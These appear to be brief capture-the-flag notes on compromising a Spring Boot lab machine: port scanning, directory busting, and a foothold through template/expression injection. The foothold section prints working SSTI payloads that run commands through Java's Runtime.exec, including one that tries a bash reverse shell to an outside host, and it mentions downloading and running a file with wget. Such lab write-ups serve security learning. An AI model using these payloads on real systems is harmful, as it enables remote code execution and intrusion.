IP:10.10.11.170

# Recon
## Nmap
2 ports
- 22 ssh
- 8080 http
Made with spring boot.

## port 8080
errors when a white space is put in.
No sqli
2 authors
woodenk and damian.
xml file

### Dir bust
- search
- stats
- error

# Foothold
there is an injection with \*{4\*4}
checking hacktricks for POC
```ssti
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```
Spawn a revshell.
```ssti
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('bash -i /dev/tcp/10.10.14.11/9001 0>&1').getInputStream())}
```
This doesn't work.
getting the file with wget the executing it might?
yep it does.